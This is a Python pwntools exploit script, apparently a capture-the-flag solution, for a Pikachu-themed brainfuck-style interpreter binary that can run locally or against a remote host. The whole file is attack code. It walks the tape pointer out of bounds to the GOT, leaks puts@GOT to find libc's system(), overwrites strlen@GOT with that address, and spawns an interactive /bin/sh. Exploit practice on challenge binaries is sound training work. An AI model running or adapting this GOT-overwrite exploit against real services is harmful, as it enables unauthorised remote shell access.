import sys
from pwn import *

# Tokens for the custom language
TOK_GOR = "pipi"
TOK_GOL = "pichu"
TOK_INC = "pi"
TOK_DEC = "ka"
TOK_OUT = "pikachu"
TOK_INP = "pikapi"
TOK_JFW = "pika"
TOK_JBK = "chu"

# Command to execute
CMD = "/bin/sh"

# Ensure proper usage
if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <local|remote> [host] [port]")
    exit(1)

# Initialize process
p = None
if sys.argv[1] == "local":
    try:
        p = process("./pikalang.bin")
    except FileNotFoundError:
        print("Error: './pikalang.bin' not found. Ensure the binary exists in the specified path.")
        exit(1)
elif sys.argv[1] == "remote":
    if len(sys.argv) < 4:
        print("For remote mode, you need to provide both host and port.")
        exit(1)
    try:
        host = sys.argv[2]
        port = int(sys.argv[3])
        p = remote(host, port)
    except Exception as e:
        print(f"Error initializing remote connection: {e}")
        exit(1)
else:
    print(f"Invalid mode: {sys.argv[1]}. Use 'local' or 'remote'.")
    exit(1)

# Ensure p is defined
if p is None:
    print("Error: Failed to initialize process.")
    exit(1)

# Load ELF and symbols
bin = ELF("./pikalang.bin")
libc = ELF("./libc.so.6")

# Define offsets and GOT addresses
OFFSET_STRLEN = libc.symbols["strlen"]
OFFSET_PUTS = libc.symbols["puts"]
OFFSET_SYSTEM = libc.symbols["system"]
DATA_TAPE = bin.symbols["tape"]
GOT_PUTS = bin.got["puts"]
GOT_STRLEN = bin.got["strlen"]

# Read initial message
p.readuntil(b"quit):\n")
# Move tape pointer to puts@GOT
for _ in range(DATA_TAPE - GOT_PUTS):
    p.send(f"{TOK_GOL} ".encode())

# Leak puts@GOT
for _ in range(8):
    p.send(f"{TOK_OUT} {TOK_GOR} ".encode())
p.send(b"\n")

leak = u64(p.read(8))
libc_base = leak - OFFSET_PUTS
libc_system = libc_base + OFFSET_SYSTEM

print(f"Leaked puts@GOT: {leak:#x}")
print(f"Libc base:       {libc_base:#x}")
print(f"Libc system():   {libc_system:#x}")

# Move tape pointer to strlen@GOT
p.readuntil(b"quit):\n")
for _ in range(DATA_TAPE - GOT_STRLEN):
    p.send(f"{TOK_GOL} ".encode())

# Leak strlen@GOT
strlen_ptr = b""
for _ in range(8):
    p.send(f"{TOK_OUT} {TOK_GOR} ".encode())
p.send(b"\n")
strlen_ptr = p.read(8)
strlen_int = u64(strlen_ptr)

print(f"Leaked strlen():  {strlen_int:#x}")

# Overwrite strlen@GOT with system()
p.readuntil(b"quit):\n")
for _ in range(DATA_TAPE - GOT_STRLEN):
    p.send(f"{TOK_GOL} ".encode())

# Modify strlen pointer to point to system
for i in range(8):
    curr = strlen_ptr[i]
    need = (libc_system >> (i * 8)) & 0xff
    diff = (need - curr) % 256

    if diff > 0:
        for _ in range(diff):
            p.send(f"{TOK_INC} ".encode())
    elif diff < 0:
        for _ in range(-diff):
            p.send(f"{TOK_DEC} ".encode())
    p.send(f"{TOK_GOR} ".encode())

p.send(b"\n")
print("Overwrote strlen() pointer with system() pointer.")

# Trigger the shell
p.readuntil(b"quit):\n")
p.send(f"{CMD}\n".encode())
p.interactive()
